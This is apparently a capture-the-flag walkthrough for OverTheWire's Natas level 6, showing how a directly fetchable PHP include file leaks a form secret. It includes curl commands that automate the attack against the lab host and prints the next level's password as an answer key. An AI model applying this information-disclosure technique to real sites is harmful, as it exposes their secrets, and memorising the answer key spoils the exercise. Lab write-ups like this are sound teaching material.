# Natas Level 6 → 7

## Goal

The page shows a form asking for a "secret." It links to the source code — in that source, you'll see the secret is loaded from `includes/secret.inc`, a PHP include file that you can fetch directly as if it were any other static file.

## Concepts you'll learn

- "View sourcecode" links on Natas reveal the PHP driving the page — read them
- PHP `include` files are served as plain text unless the web server is configured to treat them as PHP
- The general pattern: if a path appears in the code, try fetching it directly

## Walkthrough

### 1. Look at the source

Open `http://natas6.natas.labs.overthewire.org/` and click "View sourcecode." You'll see something like:

```php
<?
include "includes/secret.inc";

if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        echo "Access granted. The password for natas7 is <censored>";
    } else {
        echo "Wrong secret";
    }
}
?>
```

So `includes/secret.inc` defines `$secret`. Fetch it directly:

### 2. Fetch the include file

```
http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Output:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

(The exact string differs; read whatever `$secret` is set to.)

### 3. Submit the secret

Back on the main page, type that secret into the form field and submit. The page responds with:

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

### 4. (Alternative) One-shot curl

```bash
$ SECRET=$(curl -su natas6:<pass> http://natas6.natas.labs.overthewire.org/includes/secret.inc | grep -oP '"\K[^"]+')
$ curl -su natas6:<pass> -d "secret=$SECRET&submit=submit" http://natas6.natas.labs.overthewire.org/index.php | grep password
```

## The answer

The password for `natas7` is:

**`7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas6.natas.labs.overthewire.org/>
